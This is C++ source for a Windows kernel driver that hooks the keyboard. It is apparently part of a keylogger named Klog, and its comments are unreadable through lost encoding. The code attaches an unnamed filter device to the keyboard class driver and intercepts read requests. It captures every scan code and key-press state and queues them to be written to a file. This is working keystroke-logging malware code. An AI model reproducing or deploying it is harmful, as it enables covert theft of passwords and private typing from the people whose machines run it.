extern "C"
{
	#include "ntddk.h"//extern DDK ����
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"


extern numPendingIrps;

// ��ȡ��ֵ��ԭ��
//
//  ����ϵͳ�����̵��豸ջ���Ϳյ�irp��
//
//  irp��������������readdispatcher�ػ�
//
//  �յ�irp��������Ӳ���ӿ�ջ�ȴ����̼���
//
//  �������а��������£�irp�õ���ֵ�������ͻ��豸ջ
//
//  �ڷ����豸ջ�Ĺ����У����������õ����̵ļ�ֵ


// �ж����󼶱�Ϊ��passive
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
{
//	__asm int 3;
	DbgPrint("Entering Hook Routine...\n");

	//�����豸����
	PDEVICE_OBJECT pKeyboardDeviceObject;

	//���������豸����
	NTSTATUS status = IoCreateDevice(pDriverObject,sizeof(DEVICE_EXTENSION), NULL, //no name
		FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardDeviceObject);

	//ȷ���Ƿ���ȷ�����豸
	if(!NT_SUCCESS(status))
		return status;

	DbgPrint("Created keyboard device successfully...\n");


	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	DbgPrint("Flags set succesfully...\n");

	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	DbgPrint("Device Extension Initialized...\n");

	//�õ��豸��չ��ָ��
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	CCHAR		 ntNameBuffer[64] = "\\Device\\KeyboardClass0";
    STRING		 ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &uKeyboardDeviceName, &ntNameString, TRUE );
	IoAttachDevice(pKeyboardDeviceObject,&uKeyboardDeviceName,&pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);
	DbgPrint("Filter Device Attached Successfully...\n");

	return STATUS_SUCCESS;
}// HookKeyboard




// �ж�����ȼ�Ϊ DISPATCH
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{

	DbgPrint("Entering DispatchRead Routine...\n");

	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	//���ٹ���irp
	 numPendingIrps++;

	DbgPrint("Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");

	//��irp���͵�������
	return IoCallDriver(((PDEVICE_EXTENSION) pDeviceObject->DeviceExtension)->pKeyboardDevice ,pIrp);

}// DispatchRead




//�ж�����ȼ�Ϊ  DISPATCH
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	DbgPrint("Entering OnReadCompletion Routine...\n");

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	if(pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for(int i = 0; i < numKeys; i++)
		{
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);

			if(keys[i].Flags == KEY_BREAK)
				DbgPrint("%s\n","Key Up");

			if(keys[i].Flags == KEY_MAKE)
				DbgPrint("%s\n","Key Down");

			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));

			// IRP��irp�еļ�ֵ��ֵ���ṹ��kData
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;

			//ͨ�����н�ɨ�赽��ֵд���ļ�
			DbgPrint("Adding IRP to work queue...");
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
			&kData->ListEntry,
			&pKeyboardDeviceExtension->lockQueue);

			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue,0,1,FALSE);

		}
	}
	//��ǹ����irp
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//�Ƴ�����ǵ�irp
	 numPendingIrps--;

	return pIrp->IoStatus.Status;
}//OnReadCompletion

